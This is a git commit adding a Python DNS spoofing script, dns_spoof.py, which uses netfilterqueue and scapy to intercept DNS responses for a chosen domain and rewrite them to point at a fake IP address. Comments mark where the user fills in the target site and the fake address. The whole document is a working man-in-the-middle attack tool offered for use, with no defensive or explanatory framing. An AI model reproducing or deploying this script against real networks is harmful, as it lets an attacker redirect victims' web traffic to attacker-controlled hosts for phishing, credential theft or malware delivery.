c8b4964d1b691c821aa38023c20d7fc844e69c8f
Darshil Desai <32188374+dexter-morgan@users.noreply.github.com>
2018-12-07 18:19:00 +0530

    Create dns_spoof.py

---
+++ dns_spoof.py
@@ -0,0 +1,29 @@
+#!usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "xyzabc.com" in qname:                                      #Enter Website to spoof here
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")      #Enter fake ip here
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(scapy_packet))
+
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
